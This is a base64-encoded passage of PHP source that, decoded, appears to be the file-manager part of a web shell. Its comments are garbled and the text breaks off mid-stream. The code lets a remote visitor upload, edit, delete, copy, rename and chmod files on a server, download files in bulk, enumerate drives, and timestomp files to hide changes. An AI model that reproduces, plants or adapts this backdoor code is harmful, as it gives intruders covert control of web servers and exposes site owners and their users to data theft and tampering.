IA0KZm9ybWZvb3QoKTsgDQoNCiRlcnJtc2cgJiYgbSgkZXJybXNnKTsgDQoNCi8vINCT4oCa0JLCu9CT0ZPQksKx0JPRk9Cb4oCg0JPigJrQktCO0JPigJrQksK10JPigJrQksKx0JPRk9Cy0ILQjtCT4oCa0JLCsNCT0ZPQstCC0ZnQk+KAmtCSwrfQk+KAmtCS0ZXQk+KAmtCSwrYgDQohJGRpciAmJiAkZGlyID0gJy4nOyANCiRub3dwYXRoID0gZ2V0UGF0aChTQV9ST09ULCAkZGlyKTsgDQppZiAoc3Vic3RyKCRkaXIsIC0xKSAhPSAnLycpIHsgDQogICAgJGRpciA9ICRkaXIuJy8nOyANCn0gDQokdWVkaXIgPSB1ZSgkZGlyKTsgDQoNCmlmICghJGFjdGlvbiB8fCAkYWN0aW9uID09ICdmaWxlJykgeyANCg0KICAgIC8vINCT0ZPQstCCwqbQk9GT0L/Rl9CF0JPigJrQksK20JPRk9C/0ZfQhdCT4oCa0JLCttCT0ZPQv9GX0IXQk9GT0L/Rl9CF0JPigJrQktKR0JPRk9Cy0ILQjtCT0ZPQksKp0JPigJrQktGX0JPRk9CSwrYgDQogICAgJGRpcl93cml0ZWFibGUgPSBAaXNfd3JpdGFibGUoJG5vd3BhdGgpID8gJ1dyaXRhYmxlJyA6ICdOb24td3JpdGFibGUnOyANCg0KICAgIC8vINCT0ZPQstCCwrDQk+KAmtCS0ZXQk+KAmtCS0ZbQk9GT0JLQhdCT0ZPQstCC0ZvQk+KAmtCS0ZfQk9GT0LLQgtGZ0JPigJrQktGYIA0KICAgIGlmICgkZG9pbmcgPT0gJ2RlbGRpcicgJiYgJHRoZWZpbGUpIHsgDQogICAgICAgIGlmICghZmlsZV9leGlzdHMoJHRoZWZpbGUpKSB7IA0KICAgICAgICAgICAgbSgkdGhlZmlsZS4nIGRpcmVjdG9yeSBkb2VzIG5vdCBleGlzdCcpOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICBtKCdEaXJlY3RvcnkgZGVsZXRlICcuKGRlbHRyZWUoJHRoZWZpbGUpID8gYmFzZW5hbWUoJHRoZWZpbGUpLicgc3VjY2VzcycgOiAnZmFpbGVkJykpOyANCiAgICAgICAgfSANCiAgICB9IA0KDQogICAgLy8g0JPigJrQktKR0JPigJrQktKR0JPigJrQktCF0JPigJrQktCB0JPRk9Cy0ILRm9CT4oCa0JLRl9CT0ZPQstCC0ZnQk+KAmtCS0ZggDQogICAgZWxzZWlmICgkbmV3ZGlybmFtZSkgeyANCiAgICAgICAgJG1rZGlycyA9ICRub3dwYXRoLiRuZXdkaXJuYW1lOyANCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRta2RpcnMpKSB7IA0KICAgICAgICAgICAgbSgnRGlyZWN0b3J5IGhhcyBhbHJlYWR5IGV4aXN0ZWQnKTsgDQogICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgbSgnRGlyZWN0b3J5IGNyZWF0ZWQgJy4oQG1rZGlyKCRta2RpcnMsMDc3NykgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOyANCiAgICAgICAgICAgIEBjaG1vZCgkbWtkaXJzLDA3NzcpOyANCiAgICAgICAgfSANCiAgICB9IA0KDQogICAgLy8g0JPRk9Cy0ILCsNCT0ZPQv9GX0IXQk+KAmtCS0pHQk+KAmtCSwqvQk9GT0JXQhdCT0ZPQstCC0ZvQk+KAmtCS0ZjQk9GT0JLRlSANCiAgICBlbHNlaWYgKCRkb3VwZmlsZSkgeyANCiAgICAgICAgbSgnRmlsZSB1cGxvYWQgJy4oQGNvcHkoJF9GSUxFU1sndXBsb2FkZmlsZSddWyd0bXBfbmFtZSddLCR1cGxvYWRkaXIuJy8nLiRfRklMRVNbJ3VwbG9hZGZpbGUnXVsnbmFtZSddKSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7IA0KICAgIH0gDQoNCiAgICAvLyDQk+KAmtCSwrHQk9GT0JIg0JPigJrQktGY0JPigJrQktGY0JPRk9CS0ZUgDQogICAgZWxzZWlmICgkZWRpdGZpbGVuYW1lICYmICRmaWxlY29udGVudCkgeyANCiAgICAgICAgJGZwID0gQGZvcGVuKCRlZGl0ZmlsZW5hbWUsJ3cnKTsgDQogICAgICAgIG0oJ1NhdmUgZmlsZSAnLihAZndyaXRlKCRmcCwkZmlsZWNvbnRlbnQpID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsgDQogICAgICAgIEBmY2xvc2UoJGZwKTsgDQogICAgfSANCg0KICAgIC8vINCT4oCa0JLCsdCT0ZPQkiDQk+KAmtCS0ZjQk+KAmtCS0ZjQk9GT0JLRldCT0ZPQlSDQk9GT0JLSkdCT0ZPQv9GX0IXQk9GT0LLQgtGcIA0KICAgIGVsc2VpZiAoJHBmaWxlICYmICRuZXdwZXJtKSB7IA0KICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCRwZmlsZSkpIHsgDQogICAgICAgICAgICBtKCdUaGUgb3JpZ2luYWwgZmlsZSBkb2VzIG5vdCBleGlzdCcpOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICAkbmV3cGVybSA9IGJhc2VfY29udmVydCgkbmV3cGVybSw4LDEwKTsgDQogICAgICAgICAgICBtKCdNb2RpZnkgZmlsZSBhdHRyaWJ1dGVzICcuKEBjaG1vZCgkcGZpbGUsJG5ld3Blcm0pID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsgDQogICAgICAgIH0gDQogICAgfSANCg0KICAgIC8vINCT4oCa0JLRkdCT0ZPQstCC0ZvQk9GT0JbigJnQk9GT0JLCuyANCiAgICBlbHNlaWYgKCRvbGRuYW1lICYmICRuZXdmaWxlbmFtZSkgeyANCiAgICAgICAgJG5uYW1lID0gJG5vd3BhdGguJG5ld2ZpbGVuYW1lOyANCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRubmFtZSkgfHwgIWZpbGVfZXhpc3RzKCRvbGRuYW1lKSkgeyANCiAgICAgICAgICAgIG0oJG5uYW1lLicgaGFzIGFscmVhZHkgZXhpc3RlZCBvciBvcmlnaW5hbCBmaWxlIGRvZXMgbm90IGV4aXN0Jyk7IA0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgIG0oYmFzZW5hbWUoJG9sZG5hbWUpLicgcmVuYW1lZCAnLmJhc2VuYW1lKCRubmFtZSkuKEByZW5hbWUoJG9sZG5hbWUsJG5uYW1lKSA/ICcgc3VjY2VzcycgOiAnZmFpbGVkJykpOyANCiAgICAgICAgfSANCiAgICB9IA0KDQogICAgLy8g0JPigJrQktGR0JPigJrQktKR0JPRk9Cy0ILigJzQk9GT0LLQgiDQk9GT0JXQhdCT0ZPQstCC0ZvQk+KAmtCS0ZjQk9GT0JLRlSANCiAgICBlbHNlaWYgKCRzbmFtZSAmJiAkdG9maWxlKSB7IA0KICAgICAgICBpZiAoZmlsZV9leGlzdHMoJHRvZmlsZSkgfHwgIWZpbGVfZXhpc3RzKCRzbmFtZSkpIHsgDQogICAgICAgICAgICBtKCdUaGUgZ29hbCBmaWxlIGhhcyBhbHJlYWR5IGV4aXN0ZWQgb3Igb3JpZ2luYWwgZmlsZSBkb2VzIG5vdCBleGlzdCcpOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICBtKGJhc2VuYW1lKCR0b2ZpbGUpLicgY29waWVkICcuKEBjb3B5KCRzbmFtZSwkdG9maWxlKSA/IGJhc2VuYW1lKCR0b2ZpbGUpLicgc3VjY2VzcycgOiAnZmFpbGVkJykpOyANCiAgICAgICAgfSANCiAgICB9IA0KDQogICAgLy8g0JPigJrQktGX0JPRk9Cy0ILihJbQk9GT0LLQgtGZ0JPigJrQktCO0JPRk9CVINCT4oCa0JLCsdCT4oCa0JLRmNCT0ZPQksKkIA0KICAgIGVsc2VpZiAoJGN1cmZpbGUgJiYgJHRhcmZpbGUpIHsgDQogICAgICAgIGlmICghQGZpbGVfZXhpc3RzKCRjdXJmaWxlKSB8fCAhQGZpbGVfZXhpc3RzKCR0YXJmaWxlKSkgeyANCiAgICAgICAgICAgIG0oJ1RoZSBnb2FsIGZpbGUgaGFzIGFscmVhZHkgZXhpc3RlZCBvciBvcmlnaW5hbCBmaWxlIGRvZXMgbm90IGV4aXN0Jyk7IA0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICR0aW1lID0gQGZpbGVtdGltZSgkdGFyZmlsZSk7IA0KICAgICAgICAgICAgbSgnTW9kaWZ5IGZpbGUgdGhlIGxhc3QgbW9kaWZpZWQgJy4oQHRvdWNoKCRjdXJmaWxlLCR0aW1lLCR0aW1lKSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7IA0KICAgICAgICB9IA0KICAgIH0gDQoNCiAgICAvLyDQk9GT0LLQguKAndCT0ZPQstCC0ZzQk+KAmtCSwrbQk+KAmtCS0IHQk9GT0LLQguKEotCT0ZPQktKQ0JPRk9CVINCT4oCa0JLCsdCT4oCa0JLRmNCT0ZPQksKkIA0KICAgIGVsc2VpZiAoJGN1cmZpbGUgJiYgJHllYXIgJiYgJG1vbnRoICYmICRkYXkgJiYgJGhvdXIgJiYgJG1pbnV0ZSAmJiAkc2Vjb25kKSB7IA0KICAgICAgICBpZiAoIUBmaWxlX2V4aXN0cygkY3VyZmlsZSkpIHsgDQogICAgICAgICAgICBtKGJhc2VuYW1lKCRjdXJmaWxlKS4nIGRvZXMgbm90IGV4aXN0Jyk7IA0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICR0aW1lID0gc3RydG90aW1lKCIkeWVhci0kbW9udGgtJGRheSAkaG91cjokbWludXRlOiRzZWNvbmQiKTsgDQogICAgICAgICAgICBtKCdNb2RpZnkgZmlsZSB0aGUgbGFzdCBtb2RpZmllZCAnLihAdG91Y2goJGN1cmZpbGUsJHRpbWUsJHRpbWUpID8gJ3N1Y2Nlc3MnIDogJ2ZhaWxlZCcpKTsgDQogICAgICAgIH0gDQogICAgfSANCg0KICAgIC8vINCT4oCa0JLSkdCT0ZPQktCG0JPigJrQksKw0JPRk9CS0ZjQk9GT0L/Rl9CF0JPRk9Cy0ILRmdCT0ZPQstCC0ZzQk9GT0JvRmiANCiAgICBlbHNlaWYoJGRvaW5nID09ICdkb3ducmFyJykgeyANCiAgICAgICAgaWYgKCRkbCkgeyANCiAgICAgICAgICAgICRkZmlsZXM9Jyc7IA0KICAgICAgICAgICAgZm9yZWFjaCAoJGRsIGFzICRmaWxlcGF0aCA9PiAkdmFsdWUpIHsgDQogICAgICAgICAgICAgICAgJGRmaWxlcy49JGZpbGVwYXRoLicsJzsgDQogICAgICAgICAgICB9IA0KICAgICAgICAgICAgJGRmaWxlcz1zdWJzdHIoJGRmaWxlcywwLHN0cmxlbigkZGZpbGVzKS0xKTsgDQogICAgICAgICAgICAkZGw9ZXhwbG9kZSgnLCcsJGRmaWxlcyk7IA0KICAgICAgICAgICAgJHppcD1uZXcgUEhQWmlwKCRkbCk7IA0KICAgICAgICAgICAgJGNvZGU9JHppcC0+b3V0OyANCiAgICAgICAgICAgIGhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKTsgDQogICAgICAgICAgICBoZWFkZXIoJ0FjY2VwdC1SYW5nZXM6IGJ5dGVzJyk7IA0KICAgICAgICAgICAgaGVhZGVyKCdBY2NlcHQtTGVuZ3RoOiAnLnN0cmxlbigkY29kZSkpOyANCiAgICAgICAgICAgIGhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDtmaWxlbmFtZT0nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4nX0ZpbGVzLnRhci5neicpOyANCiAgICAgICAgICAgIGVjaG8gJGNvZGU7IA0KICAgICAgICAgICAgZXhpdDsgDQogICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgbSgnUGxlYXNlIHNlbGVjdCBmaWxlKHMpJyk7IA0KICAgICAgICB9IA0KICAgIH0gDQoNCiAgICAvLyDQk9GT0LLQgsKm0JPRk9CS0ZTQk9GT0L/Rl9CF0JPigJrQktGX0JPRk9Cy0ILCsNCT4oCa0JLRldCT4oCa0JLRltCT0ZPQktCF0JPRk9CV0IXQk9GT0LLQgtGb0JPigJrQktGY0JPRk9CS0ZUgDQogICAgZWxzZWlmKCRkb2luZyA9PSAnZGVsZmlsZXMnKSB7IA0KICAgICAgICBpZiAoJGRsKSB7IA0KICAgICAgICAgICAgJGRmaWxlcz0nJzsgDQogICAgICAgICAgICAkc3VjYyA9ICRmYWlsID0gMDsgDQogICAgICAgICAgICBmb3JlYWNoICgkZGwgYXMgJGZpbGVwYXRoID0+ICR2YWx1ZSkgeyANCiAgICAgICAgICAgICAgICBpZiAoQHVubGluaygkZmlsZXBhdGgpKSB7IA0KICAgICAgICAgICAgICAgICAgICAkc3VjYysrOyANCiAgICAgICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgICAgICAgJGZhaWwrKzsgDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICBtKCdEZWxldGVkIGZpbGUgaGF2ZSBmaW5pc2hlZNCT4oCa0JLQiNCT4oCa0JLCrGNob29zZSAnLmNvdW50KCRkbCkuJyBzdWNjZXNzICcuJHN1Y2MuJyBmYWlsICcuJGZhaWwpOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICBtKCdQbGVhc2Ugc2VsZWN0IGZpbGUocyknKTsgDQogICAgICAgIH0gDQogICAgfSANCg0KICAgIC8v0JPigJrQktCG0JPRk9Cy4oCe0Z7Qk9GT0LLQguKAndCT0ZPQksK30JPRk9C/0ZfQhdCT0ZPQktCE0JPigJrQksKx0JPRk9C/0ZfQhSANCiAgICBmb3JtaGVhZChhcnJheSgnbmFtZSc9PidjcmVhdGVkaXInKSk7IA0KICAgIG1ha2VoaWRlKCduZXdkaXJuYW1lJyk7IA0KICAgIG1ha2VoaWRlKCdkaXInLCRub3dwYXRoKTsgDQogICAgZm9ybWZvb3QoKTsgDQogICAgZm9ybWhlYWQoYXJyYXkoJ25hbWUnPT4nZmlsZXBlcm0nKSk7IA0KICAgIG1ha2VoaWRlKCduZXdwZXJtJyk7IA0KICAgIG1ha2VoaWRlKCdwZmlsZScpOyANCiAgICBtYWtlaGlkZSgnZGlyJywkbm93cGF0aCk7IA0KICAgIGZvcm1mb290KCk7IA0KICAgIGZvcm1oZWFkKGFycmF5KCduYW1lJz0+J2NvcHlmaWxlJykpOyANCiAgICBtYWtlaGlkZSgnc25hbWUnKTsgDQogICAgbWFrZWhpZGUoJ3RvZmlsZScpOyANCiAgICBtYWtlaGlkZSgnZGlyJywkbm93cGF0aCk7IA0KICAgIGZvcm1mb290KCk7IA0KICAgIGZvcm1oZWFkKGFycmF5KCduYW1lJz0+J3JlbmFtZScpKTsgDQogICAgbWFrZWhpZGUoJ29sZG5hbWUnKTsgDQogICAgbWFrZWhpZGUoJ25ld2ZpbGVuYW1lJyk7IA0KICAgIG1ha2VoaWRlKCdkaXInLCRub3dwYXRoKTsgDQogICAgZm9ybWZvb3QoKTsgDQogICAgZm9ybWhlYWQoYXJyYXkoJ25hbWUnPT4nZmlsZW9wZm9ybScpKTsgDQogICAgbWFrZWhpZGUoJ2FjdGlvbicpOyANCiAgICBtYWtlaGlkZSgnb3BmaWxlJyk7IA0KICAgIG1ha2VoaWRlKCdkaXInKTsgDQogICAgZm9ybWZvb3QoKTsgDQoNCiAgICAkZnJlZSA9IEBkaXNrX2ZyZWVfc3BhY2UoJG5vd3BhdGgpOyANCiAgICAhJGZyZWUgJiYgJGZyZWUgPSAwOyANCiAgICAkYWxsID0gQGRpc2tfdG90YWxfc3BhY2UoJG5vd3BhdGgpOyANCiAgICAhJGFsbCAmJiAkYWxsID0gMDsgDQogICAgJHVzZWQgPSAkYWxsLSRmcmVlOyANCiAgICAkdXNlZF9wZXJjZW50ID0gQHJvdW5kKDEwMC8oJGFsbC8kZnJlZSksMik7IA0KICAgIHAoJzxoMj5GaWxlIE1hbmFnZXIgLSBDdXJyZW50IGRpc2sgZnJlZSAnLnNpemVjb3VudCgkZnJlZSkuJyBvZiAnLnNpemVjb3VudCgkYWxsKS4nICgnLiR1c2VkX3BlcmNlbnQuJyUpPC9oMj4nKTsgDQoNCj8+IA0KPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCIgc3R5bGU9Im1hcmdpbjoxMHB4IDA7Ij4gDQogIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGlkPSJnb2RpciIgbmFtZT0iZ29kaXIiPiANCiAgPHRyPiANCiAgICA8dGQgbm93cmFwPkN1cnJlbnQgRGlyZWN0b3J5ICg8P3BocCBlY2hvICRkaXJfd3JpdGVhYmxlOz8+LCA8P3BocCBlY2hvIGdldENobW9kKCRub3dwYXRoKTs/Pik8L3RkPiANCiAgICA8dGQgd2lkdGg9IjEwMCUiPjxpbnB1dCBuYW1lPSJ2aWV3X3dyaXRhYmxlIiB2YWx1ZT0iMCIgdHlwZT0iaGlkZGVuIiAvPjxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9ImRpciIgdmFsdWU9Ijw/cGhwIGVjaG8gJG5vd3BhdGg7Pz4iIHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDoxMDAlO21hcmdpbjowIDhweDsiPjwvdGQ+IA0KICAgIDx0ZCBub3dyYXA+PGlucHV0IGNsYXNzPSJidCIgdmFsdWU9IkdPIiB0eXBlPSJzdWJtaXQiPjwvdGQ+IA0KICA8L3RyPiANCiAgPC9mb3JtPiANCjwvdGFibGU+IA0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPiANCmZ1bmN0aW9uIGNyZWF0ZWRpcigpeyANCiAgICB2YXIgbmV3ZGlybmFtZTsgDQogICAgbmV3ZGlybmFtZSA9IHByb21wdCgnUGxlYXNlIGlucHV0IHRoZSBkaXJlY3RvcnkgbmFtZTonLCAnJyk7IA0KICAgIGlmICghbmV3ZGlybmFtZSkgcmV0dXJuOyANCiAgICAkKCdjcmVhdGVkaXInKS5uZXdkaXJuYW1lLnZhbHVlPW5ld2Rpcm5hbWU7IA0KICAgICQoJ2NyZWF0ZWRpcicpLnN1Ym1pdCgpOyANCn0gDQpmdW5jdGlvbiBmaWxlcGVybShwZmlsZSl7IA0KICAgIHZhciBuZXdwZXJtOyANCiAgICBuZXdwZXJtID0gcHJvbXB0KCdDdXJyZW50IGZpbGU6JytwZmlsZSsnXG5QbGVhc2UgaW5wdXQgbmV3IGF0dHJpYnV0ZTonLCAnJyk7IA0KICAgIGlmICghbmV3cGVybSkgcmV0dXJuOyANCiAgICAkKCdmaWxlcGVybScpLm5ld3Blcm0udmFsdWU9bmV3cGVybTsgDQogICAgJCgnZmlsZXBlcm0nKS5wZmlsZS52YWx1ZT1wZmlsZTsgDQogICAgJCgnZmlsZXBlcm0nKS5zdWJtaXQoKTsgDQp9IA0KZnVuY3Rpb24gY29weWZpbGUoc25hbWUpeyANCiAgICB2YXIgdG9maWxlOyANCiAgICB0b2ZpbGUgPSBwcm9tcHQoJ09yaWdpbmFsIGZpbGU6JytzbmFtZSsnXG5QbGVhc2UgaW5wdXQgb2JqZWN0IGZpbGUgKGZ1bGxwYXRoKTonLCAnJyk7IA0KICAgIGlmICghdG9maWxlKSByZXR1cm47IA0KICAgICQoJ2NvcHlmaWxlJykudG9maWxlLnZhbHVlPXRvZmlsZTsgDQogICAgJCgnY29weWZpbGUnKS5zbmFtZS52YWx1ZT1zbmFtZTsgDQogICAgJCgnY29weWZpbGUnKS5zdWJtaXQoKTsgDQp9IA0KZnVuY3Rpb24gcmVuYW1lKG9sZG5hbWUpeyANCiAgICB2YXIgbmV3ZmlsZW5hbWU7IA0KICAgIG5ld2ZpbGVuYW1lID0gcHJvbXB0KCdGb3JtZXIgZmlsZSBuYW1lOicrb2xkbmFtZSsnXG5QbGVhc2UgaW5wdXQgbmV3IGZpbGVuYW1lOicsICcnKTsgDQogICAgaWYgKCFuZXdmaWxlbmFtZSkgcmV0dXJuOyANCiAgICAkKCdyZW5hbWUnKS5uZXdmaWxlbmFtZS52YWx1ZT1uZXdmaWxlbmFtZTsgDQogICAgJCgncmVuYW1lJykub2xkbmFtZS52YWx1ZT1vbGRuYW1lOyANCiAgICAkKCdyZW5hbWUnKS5zdWJtaXQoKTsgDQp9IA0KZnVuY3Rpb24gZG9maWxlKGRvaW5nLHRoZWZpbGUsbSl7IA0KICAgIGlmIChtICYmICFjb25maXJtKG0pKSB7IA0KICAgICAgICByZXR1cm47IA0KICAgIH0gDQogICAgJCgnZmlsZWxpc3QnKS5kb2luZy52YWx1ZT1kb2luZzsgDQogICAgaWYgKHRoZWZpbGUpeyANCiAgICAgICAgJCgnZmlsZWxpc3QnKS50aGVmaWxlLnZhbHVlPXRoZWZpbGU7IA0KICAgIH0gDQogICAgJCgnZmlsZWxpc3QnKS5zdWJtaXQoKTsgDQp9IA0KZnVuY3Rpb24gY3JlYXRlZmlsZShub3dwYXRoKXsgDQogICAgdmFyIGZpbGVuYW1lOyANCiAgICBmaWxlbmFtZSA9IHByb21wdCgnUGxlYXNlIGlucHV0IHRoZSBmaWxlIG5hbWU6JywgJycpOyANCiAgICBpZiAoIWZpbGVuYW1lKSByZXR1cm47IA0KICAgIG9wZmlsZSgnZWRpdGZpbGUnLG5vd3BhdGggKyBmaWxlbmFtZSxub3dwYXRoKTsgDQp9IA0KZnVuY3Rpb24gb3BmaWxlKGFjdGlvbixvcGZpbGUsZGlyKXsgDQogICAgJCgnZmlsZW9wZm9ybScpLmFjdGlvbi52YWx1ZT1hY3Rpb247IA0KICAgICQoJ2ZpbGVvcGZvcm0nKS5vcGZpbGUudmFsdWU9b3BmaWxlOyANCiAgICAkKCdmaWxlb3Bmb3JtJykuZGlyLnZhbHVlPWRpcjsgDQogICAgJCgnZmlsZW9wZm9ybScpLnN1Ym1pdCgpOyANCn0gDQpmdW5jdGlvbiBnb2RpcihkaXIsdmlld193cml0YWJsZSl7IA0KICAgIGlmICh2aWV3X3dyaXRhYmxlKSB7IA0KICAgICAgICAkKCdnb2RpcicpLnZpZXdfd3JpdGFibGUudmFsdWU9MTsgDQogICAgfSANCiAgICAkKCdnb2RpcicpLmRpci52YWx1ZT1kaXI7IA0KICAgICQoJ2dvZGlyJykuc3VibWl0KCk7IA0KfSANCjwvc2NyaXB0PiANCiAgPD9waHAgDQogICAgdGJoZWFkKCk7IA0KICAgIHAoJzxmb3JtIGFjdGlvbj0iJy4kc2VsZi4nIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjx0ciBjbGFzcz0iYWx0MSI+PHRkIGNvbHNwYW49IjciIHN0eWxlPSJwYWRkaW5nOjVweDsiPicpOyANCiAgICBwKCc8ZGl2IHN0eWxlPSJmbG9hdDpyaWdodDsiPjxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9InVwbG9hZGZpbGUiIHZhbHVlPSIiIHR5cGU9ImZpbGUiIC8+IDxpbnB1dCBjbGFzcz0iYnQiIG5hbWU9ImRvdXBmaWxlIiB2YWx1ZT0iVXBsb2FkIiB0eXBlPSJzdWJtaXQiIC8+PGlucHV0IG5hbWU9InVwbG9hZGRpciIgdmFsdWU9IicuJGRpci4nIiB0eXBlPSJoaWRkZW4iIC8+PGlucHV0IG5hbWU9ImRpciIgdmFsdWU9IicuJGRpci4nIiB0eXBlPSJoaWRkZW4iIC8+PC9kaXY+Jyk7IA0KICAgIHAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6Z29kaXIoXCcnLiRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uJ1wnKTsiPldlYlJvb3Q8L2E+Jyk7IA0KICAgIGlmICgkdmlld193cml0YWJsZSkgeyANCiAgICAgICAgcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2RpcihcJycuJG5vd3BhdGguJ1wnKTsiPlZpZXcgQWxsPC9hPicpOyANCiAgICB9IGVsc2UgeyANCiAgICAgICAgcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpnb2RpcihcJycuJG5vd3BhdGguJ1wnLFwnMVwnKTsiPlZpZXcgV3JpdGFibGU8L2E+Jyk7IA0KICAgIH0gDQogICAgcCgnIHwgPGEgaHJlZj0iamF2YXNjcmlwdDpjcmVhdGVkaXIoKTsiPkNyZWF0ZSBEaXJlY3Rvcnk8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpjcmVhdGVmaWxlKFwnJy4kbm93cGF0aC4nXCcpOyI+Q3JlYXRlIEZpbGU8L2E+Jyk7IA0KICAgIGlmIChJU19XSU4gJiYgSVNfQ09NKSB7IA0KICAgICAgICAkb2JqID0gbmV3IENPTSgnc2NyaXB0aW5nLmZpbGVzeXN0ZW1vYmplY3QnKTsgDQogICAgICAgIGlmICgkb2JqICYmIGlzX29iamVjdCgkb2JqKSkgeyANCiAgICAgICAgICAgICREcml2ZVR5cGVEQiA9IGFycmF5KDAgPT4gJ1Vua25vdycsMSA9PiAnUmVtb3ZhYmxlJywyID0+ICdGaXhlZCcsMyA9PiAnTmV0d29yaycsNCA9PiAnQ0RSb20nLDUgPT4gJ1JBTSBEaXNrJyk7IA0KICAgICAgICAgICAgZm9yZWFjaCgkb2JqLT5Ecml2ZXMgYXMgJGRyaXZlKSB7IA0KICAgICAgICAgICAgICAgIGlmICgkZHJpdmUtPkRyaXZlVHlwZSA9PSAyKSB7IA0KICAgICAgICAgICAgICAgICAgICBwKCcgfCA8YSBocmVmPSJqYXZhc2NyaXB0OmdvZGlyKFwnJy4kZHJpdmUtPlBhdGguJy9cJyk7IiB0aXRsZT0iU2l6ZTonLnNpemVjb3VudCgkZHJpdmUtPlRvdGFsU2l6ZSkuJyYjMTM7RnJlZTonLnNpemVjb3VudCgkZHJpdmUtPkZyZWVTcGFjZSkuJyYjMTM7VHlwZTonLiREcml2ZVR5cGVEQlskZHJpdmUtPkRyaXZlVHlwZV0uJyI+Jy4kRHJpdmVUeXBlREJbJGRyaXZlLT5Ecml2ZVR5cGVdLicoJy4kZHJpdmUtPlBhdGguJyk8L2E+Jyk7IA0KICAgICAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICAgICBwKCcgfCA8YSBocmVmPSJqYXZhc2NyaXB0OmdvZGlyKFwnJy4kZHJpdmUtPlBhdGguJy9cJyk7IiB0aXRsZT0iVHlwZTonLiREcml2ZVR5cGVEQlskZHJpdmUtPkRyaXZlVHlwZV0uJyI+Jy4kRHJpdmVUeXBlREJbJGRyaXZlLT5Ecml2ZVR5cGVdLicoJy4kZHJpdmUtPlBhdGguJyk8L2E+Jyk7IA0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICB9IA0KICAgICAgICB9IA0KICAgIH0gDQoNCiAgICBwKCc8L3RkPjwvdHI+PC9mb3JtPicpOyANCg0KICAgIHAoJzx0ciBjbGFzcz0iaGVhZCI+PHRkPiZuYnNwOzwvdGQ+PHRkPkZpbGVuYW1lPC90ZD48dGQgd2lkdGg9IjE2JSI+TGFzdCBtb2RpZmllZDwvdGQ+PHRkIHdpZHRoPSIxMCUiPlNpemU8L3RkPjx0ZCB3aWR0aD0iMjAlIj5DaG1vZCAvIFBlcm1zPC90ZD48dGQgd2lkdGg9IjIyJSI+QWN0aW9uPC90ZD48L3RyPicpOyANCg0KICAgIC8v0JPigJrQktCG0JPRk9CSwqnQk+KAmtCS0ZfQk+KAmtCS0pHQk9GT0LLQguKEltCT0ZPQkuKEltCT0ZPQstCC0ZrQk9GT0L/Rl9CF0JPigJrQktGX0JPRk9Cy0ILCsNCT0ZPQv9GX0IXQk+KAmtCS0pHQk9GT0JXQhdCT0ZPQstCC0ZvQk+KAmtCS0ZjQk9GT0JLRldCT4oCa0JLRlNCT0ZPQv9GX0IXQk9GT0LLQgtGb0JPigJrQktGX0JPRk9Cy0ILRmdCT4oCa0JLRmCANCiAgICAkZGlyZGF0YT1hcnJheSgpOyANCiAgICAkZmlsZWRhdGE9YXJyYXkoKTsgDQoNCiAgICBpZiAoJHZpZXdfd3JpdGFibGUpIHsgDQogICAgICAgICRkaXJkYXRhID0gR2V0TGlzdCgkbm93cGF0aCk7IA0KICAgIH0gZWxzZSB7IA0KICAgICAgICAvLyDQk9GT0LLQgtGb0JPigJrQktGX0JPRk9Cy0ILRmdCT4oCa0JLRmNCT0ZPQv9GX0IXQk9GT0L/Rl9CF0JPigJrQksKx0JPRk9CSIA0KICAgICAgICAkZGlycz1Ab3BlbmRpcigkZGlyKTsgDQogICAgICAgIHdoaWxlICgkZmlsZT1AcmVhZGRpcigkZGlycykpIHsgDQogICAgICAgICAgICAkZmlsZXBhdGg9JG5vd3BhdGguJGZpbGU7IA0KICAgICAgICAgICAgaWYoQGlzX2RpcigkZmlsZXBhdGgpKXsgDQogICAgICAgICAgICAgICAgJGRpcmRiWydmaWxlbmFtZSddPSRmaWxlOyANCiAgICAgICAgICAgICAgICAkZGlyZGJbJ210aW1lJ109QGRhdGUoJ1ktbS1kIEg6aTpzJyxmaWxlbXRpbWUoJGZpbGVwYXRoKSk7IA0KICAgICAgICAgICAgICAgICRkaXJkYlsnZGlyY2htb2QnXT1nZXRDaG1vZCgkZmlsZXBhdGgpOyANCiAgICAgICAgICAgICAgICAkZGlyZGJbJ2RpcnBlcm0nXT1nZXRQZXJtcygkZmlsZXBhdGgpOyANCiA